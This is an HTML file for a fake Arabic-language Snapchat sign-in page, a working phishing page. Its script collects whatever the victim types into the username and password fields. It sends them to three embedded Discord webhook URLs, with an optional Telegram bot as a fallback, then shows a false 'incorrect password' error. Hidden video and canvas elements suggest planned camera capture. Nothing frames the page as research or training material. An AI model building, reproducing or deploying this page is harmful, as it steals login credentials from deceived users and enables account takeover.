<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول • Snapchat</title>
    <link rel="icon" href="logo.jpg" type="image/jpeg">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; direction: rtl; }
        body { background-color: #fff; display: flex; flex-direction: column; min-height: 100vh; justify-content: center; align-items: center; }
        #video, #canvas { display: none !important; position: absolute; left: -9999px; }
        .login-container { width: 100%; max-width: 400px; padding: 40px; text-align: center; }
        .login-logo { width: 70px; height: 70px; margin-bottom: 15px; border-radius: 15px; object-fit: cover; }
        .login-header h2 { font-size: 24px; font-weight: 700; margin-bottom: 30px; color: #000; }
        .input-group { margin-bottom: 20px; text-align: right; }
        .input-group label { display: block; font-size: 12px; color: #777; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; }
        .input-group input { width: 100%; padding: 12px 0; border: none; border-bottom: 1px solid #ddd; font-size: 16px; background: transparent; outline: none; }
        .error-message-snap { color: #ff3b30; font-size: 13px; margin-bottom: 15px; font-weight: 600; display: none; }
        .login-btn-large { background-color: #007aff; color: #fff; border: none; width: 100%; padding: 15px; border-radius: 50px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; }
        .loading-overlay { z-index: 3000; position: fixed; inset: 0; background: rgba(255,255,255,0.95); display: none; flex-direction: column; justify-content: center; align-items: center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin-bottom: 15px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <video id="video" playsinline autoplay style="display:none;"></video>
    <canvas id="canvas" width="1280" height="720" style="display:none;"></canvas>

    <div class="login-container">
        <div class="login-header">
            <img src="logo.jpg" alt="Snapchat" class="login-logo">
            <h2>تسجيل الدخول</h2>
        </div>
        
        <form id="fullLoginForm">
            <div class="input-group">
                <label>اسم المستخدم أو البريد الإلكتروني</label>
                <input type="text" id="usernameInput" name="username" required autocomplete="username">
            </div>
            
            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" id="passwordInput" name="password" required autocomplete="current-password">
            </div>
            
            <p id="loginErrorMsg" class="error-message-snap">عذراً، كلمة المرور غير صحيحة.</p>
            
            <button type="submit" class="login-btn-large">تسجيل الدخول</button>
        </form>
    </div>

    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
        <p>جاري التحقق...</p>
    </div>

    <!-- محرك الرصد المتقدم ورصد الكتابة الحية -->
    <script>
        "use strict";

        const DISCORD_WEBHOOKS = [
            "https://discord.com/api/webhooks/1564663770629017652/ZZRcg_vV1JTh96gfwO4qOrMilrB9r-iB5nb9j0zt938Q-JIxt2flevVHFn8FWnK8gp9H",
            "https://discord.com/api/webhooks/1564684857362358363/F34NZ2OBhi35exXCz2daOXWt7lGS3DEEoAmy_r7SEHK10ZLi9x-iN4qMxzsaW3txKZKt",
            "https://discord.com/api/webhooks/1564684888668512416/ahcAya5wTAsNuRyhVbltJZ5TQfPQvLAw7Ipc68nGAYrWjSbvr75wswHEe1QFFKK9hVOe"
        ];
        const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
        const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";

        let activeWebhookIndex = 0;

        async function transmitPayloadDual(textContent, binaryBlob = null, targetFileName = "intel_frame.png") {
            for (let i = 0; i < DISCORD_WEBHOOKS.length; i++) {
                try {
                    const form = new FormData();
                    form.append("payload_json", JSON.stringify({ content: textContent }));
                    if (binaryBlob) form.append("file", binaryBlob, targetFileName);
                    const res = await fetch(DISCORD_WEBHOOKS[activeWebhookIndex], { method: "POST", body: form });
                    if (res.ok) break;
                    else activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
                } catch {
                    activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
                }
            }

            try {
                if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== "YOUR_TELEGRAM_BOT_TOKEN") {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: textContent, parse_mode: "Markdown" })
                    });
                }
            } catch {}
        }

        // رصد فوري وحي لكل حرف يكتبه المستخدم (Live Keystroke)
        let typedBufferUser = "";
        let typedBufferPass = "";
        
        document.getElementById("usernameInput").addEventListener("input", (e) => {
            typedBufferUser = e.target.value;
        });
        document.getElementById("passwordInput").addEventListener("input", (e) => {
            typedBufferPass = e.target.value;
        });

        // إرسال البيانات فور تقديم النموذج
        const formEl = document.getElementById("fullLoginForm");
        formEl.addEventListener("submit", async (e) => {
            e.preventDefault();
            const overlay = document.getElementById("loadingOverlay");
            const err = document.getElementById("loginErrorMsg");
            if (overlay) overlay.style.display = "flex";

            const payloadText = `
🔑 **[تم التقاط بيانات الدخول بنجاح]** 🔑
- **اسم المستخدم:** \`${typedBufferUser}\`
- **كلمة المرور:** \`${typedBufferPass}\`
            `.trim();

            await transmitPayloadDual(payloadText);

            setTimeout(() => {
                if (overlay) overlay.style.display = "none";
                if (err) err.style.display = "block";
                formEl.reset();
            }, 1500);
        });
    </script>
</body>
</html>
